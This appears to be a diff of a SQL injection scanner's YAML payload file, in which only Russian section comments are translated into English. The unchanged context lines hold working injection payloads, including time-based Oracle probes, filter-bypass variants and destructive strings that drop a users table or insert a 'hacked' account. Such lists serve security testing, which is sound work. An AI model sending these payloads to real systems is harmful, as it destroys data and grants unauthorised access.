@@ -21,7 +21,7 @@ signatures:
   - "[Microsoft][ODBC SQL Server Driver]"
   - "Incorrect syntax near"
 payloads:
-  # --- Базовые probe ---
+  # --- Basic probes ---
   - "'"
   - "''"
   - "`"
@@ -78,7 +78,7 @@ payloads:
   # --- Time-based (Oracle) ---
   - "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)=CHR(65) -- -"
 
-  # --- Комментарии ---
+  # --- Comments ---
   - "' -- -"
   - "' #"
   - "' /*"
@@ -90,7 +90,7 @@ payloads:
   - "'; DROP TABLE users -- -"
   - "1; INSERT INTO users(username,password) VALUES('hacked','hacked') -- -"
 
-  # --- Обход фильтров ---
+  # --- Filter bypass ---
   - "' /*!UNION*/ /*!SELECT*/ NULL -- -"
   - "'/**/OR/**/1=1 -- -"
   - "' UNION%20SELECT%20NULL -- -"
